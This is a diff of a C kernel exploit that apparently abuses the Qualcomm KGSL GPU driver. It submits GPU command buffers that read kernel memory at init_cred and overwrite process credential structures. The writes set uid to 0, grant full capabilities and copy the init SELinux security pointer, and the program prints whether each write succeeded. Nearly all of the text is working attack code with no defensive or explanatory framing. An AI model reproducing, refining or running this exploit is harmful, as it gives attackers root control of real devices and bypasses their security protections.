@@ -264,10 +264,6 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
-uint64_t g_init_cred_security = 0;
-uint64_t g_init_user_ns = 0;
-uint64_t g_init_group_info = 0;
-
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
 
@@ -489,6 +485,7 @@ int main(int argc, char **argv) {
                 n_comm++;
             }
         }
+
         if (n_comm > 0) {
             printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
                 (unsigned long)va, nz, comm_off);
@@ -547,17 +544,19 @@ int main(int argc, char **argv) {
         saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
     }
 
+    uint64_t inc_sec = 0;
     {
-        printf("[*] Phase 7e: Reading init_cred fields (security, user_ns, group_info)\n");
+        printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
         memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
         uint64_t test_vas[] = {
+            init_cred_addr,
             init_cred_addr + 0x78,
-            init_cred_addr + 0x88,
-            init_cred_addr + 0x90,
+            0xFFFFFFC000000000ULL,
+            0xFFFFFF8000000000ULL,
         };
         uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
         tcmd[tdw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 3; i++) {
+        for (int i = 0; i < 4; i++) {
             uint32_t dl, dh, sl, sh;
             split64(dst_ga + i * 8, &dl, &dh);
             split64(test_vas[i], &sl, &sh);
@@ -572,12 +571,12 @@ int main(int argc, char **argv) {
             wait_timestamp(kgsl_fd, ctx_id, tts);
             __sync_synchronize();
             uint32_t *td = (uint32_t *)dst_m;
-            g_init_cred_security = (uint64_t)td[1] << 32 | td[0];
-            g_init_user_ns = (uint64_t)td[3] << 32 | td[2];
-            g_init_group_info = (uint64_t)td[5] << 32 | td[4];
-            printf("  init_cred->security = 0x%lX\n", (unsigned long)g_init_cred_security);
-            printf("  init_cred->user_ns   = 0x%lX\n", (unsigned long)g_init_user_ns);
-            printf("  init_cred->group_info= 0x%lX\n", (unsigned long)g_init_group_info);
+            for (int i = 0; i < 4; i++) {
+                uint64_t val = (uint64_t)td[i*2] | ((uint64_t)td[i*2+1] << 32);
+                printf("  KVA[%d]=0x%lX => 0x%016lX\n",
+                    i, (unsigned long)test_vas[i], (unsigned long)val);
+                if (i == 1) inc_sec = val;
+            }
         }
     }
 
@@ -613,121 +612,108 @@ int main(int argc, char **argv) {
         }
     }
 
-    printf("[*] Phase 8b: Writing uid=0, full caps, and init context pointers to %d creds\n", n_cred);
-    int n_ok = 0;
-    for (int p = 0; p < n_cred && p < 32; p++) {
-        uint64_t cbase = cred_addrs[p];
-        uint32_t *cmd = (uint32_t *)ib_m;
-        uint32_t zl, zh, dl, dh, sl, sh;
-        int dw;
+    if (n_cred > 0) {
+        printf("[*] Phase 8b: Writing uid=0, full caps, and init context pointer to %d creds\n", n_cred);
+        int n_ok = 0;
+        for (int p = 0; p < n_cred && p < 32; p++) {
+            uint64_t cbase = cred_addrs[p];
+            uint32_t *cmd = (uint32_t *)ib_m;
+            uint32_t zl, zh, dl, dh, sl, sh;
+            int dw;
 
-        memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int ci = 0; ci < 48; ci++) {
-            split64(dst_ga + ci * 4, &dl, &dh);
-            split64(cbase + ci * 4, &sl, &sh);
+            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
+            dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int ci = 0; ci < 48; ci++) {
+                split64(dst_ga + ci * 4, &dl, &dh);
+                split64(cbase + ci * 4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint32_t *bd = (uint32_t *)dst_m;
+            printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
+                p, bd[31], bd[30], bd[1]);
+
+            n_ok++;
+
+            memset(ib_m, 0, 0x10000);
+            dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+
+            if (inc_sec != 0) {
+                printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
+                    (unsigned long)inc_sec, p);
+                split64(cbase + 0x78, &zl, &zh);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+                cmd[dw++] = zl; cmd[dw++] = zh;
+                split64(inc_sec, &zl, &zh);
+                cmd[dw++] = zl; cmd[dw++] = zh;
+            }
+
+            split64(cbase + 0x04, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+            cmd[dw++] = 0x00000004;
+            cmd[dw++] = 0; cmd[dw++] = 0;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0; cmd[dw++] = 0;
+
+            memset(dst_m, 0, 0x1000);
+            split64(dst_ga, &dl, &dh);
+            split64(cbase + 0x04, &sl, &sh);
             cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
             cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-        __sync_synchronize();
-        uint32_t *bd = (uint32_t *)dst_m;
-        printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-            p, bd[31], bd[30], bd[1]);
-
-        n_ok++;
-
-        memset(ib_m, 0, 0x10000);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-
-        if (g_init_cred_security != 0) {
-            split64(cbase + 0x78, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-            split64(g_init_cred_security, &zl, &zh);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-        }
-        if (g_init_user_ns != 0) {
-            split64(cbase + 0x88, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-            split64(g_init_user_ns, &zl, &zh);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-        }
-        if (g_init_group_info != 0) {
-            split64(cbase + 0x90, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-            split64(g_init_group_info, &zl, &zh);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-        }
-
-        split64(cbase + 0x04, &zl, &zh);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
-        cmd[dw++] = zl; cmd[dw++] = zh;
-        for (int i = 0; i < 8; i++) cmd[dw++] = 0;
-        cmd[dw++] = 0x00000004;
-        cmd[dw++] = 0; cmd[dw++] = 0;
-        cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-        cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-        cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-        cmd[dw++] = 0; cmd[dw++] = 0;
-
-        cmd[dw++] = cp_type7(CP_EVENT_WRITE, 0);
-        cmd[dw++] = CACHE_FLUSH_TS;
-
-        memset(dst_m, 0, 0x1000);
-        split64(dst_ga, &dl, &dh);
-        split64(cbase + 0x04, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-        cmd[dw++] = sl; cmd[dw++] = sh;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-        __sync_synchronize();
-        uint32_t uid = *(volatile uint32_t*)dst_m;
-        printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
-            uid == 0 ? "OK" : "FAIL");
-    }
-    printf("  Phase 8b: %d creds updated\n", n_ok);
-
-    if (n_cred > 0) {
-        printf("[*] Phase 8c: Dumping cred page AFTER write\n");
-        memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-        uint32_t *ccmd = (uint32_t *)ib_m;
-        int cdw = 0;
-        ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        for (int ci = 0; ci < 48; ci++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + ci * 4, &dl, &dh);
-            split64(cred_addrs[0] + ci * 4, &sl, &sh);
-            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
-            ccmd[cdw++] = sl; ccmd[cdw++] = sh;
-        }
-        ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int cts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, cts);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
-            uint32_t *cd = (uint32_t *)dst_m;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint32_t uid = *(volatile uint32_t*)dst_m;
+            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
+                uid == 0 ? "OK" : "FAIL");
+        }
+        printf("  Phase 8b: %d creds updated\n", n_ok);
+
+        if (n_cred > 0) {
+            printf("[*] Phase 8c: Dumping cred page AFTER write\n");
+            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
+            uint32_t *ccmd = (uint32_t *)ib_m;
+            int cdw = 0;
+            ccmd[cdw++] = cp_type7(CP_NOP, 0);
             for (int ci = 0; ci < 48; ci++) {
-                if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
-                printf(" %08X", cd[ci]);
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga + ci * 4, &dl, &dh);
+                split64(cred_addrs[0] + ci * 4, &sl, &sh);
+                ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
+                ccmd[cdw++] = sl; ccmd[cdw++] = sh;
             }
-            printf("\n");
-            printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
-                cd[31], cd[30], cd[1]);
+            ccmd[cdw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int cts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
+                wait_timestamp(kgsl_fd, ctx_id, cts);
+                __sync_synchronize();
+                uint32_t *cd = (uint32_t *)dst_m;
+                for (int ci = 0; ci < 48; ci++) {
+                    if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
+                    printf(" %08X", cd[ci]);
+                }
+                printf("\n");
+                printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
+                    cd[31], cd[30], cd[1]);
+            }
         }
     }
 
